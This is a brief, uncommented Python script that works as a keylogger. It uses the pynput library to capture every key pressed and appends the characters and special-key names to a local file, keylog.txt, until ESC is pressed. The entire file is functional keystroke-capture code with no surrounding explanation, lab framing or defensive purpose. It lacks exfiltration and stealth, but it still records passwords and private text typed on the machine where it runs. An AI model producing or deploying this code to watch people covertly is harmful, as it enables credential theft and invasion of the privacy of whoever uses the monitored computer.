from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Special keys (like space, enter) don't have 'char' attribute
        with open(log_file, "a") as f:
            f.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

# Start listening to keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
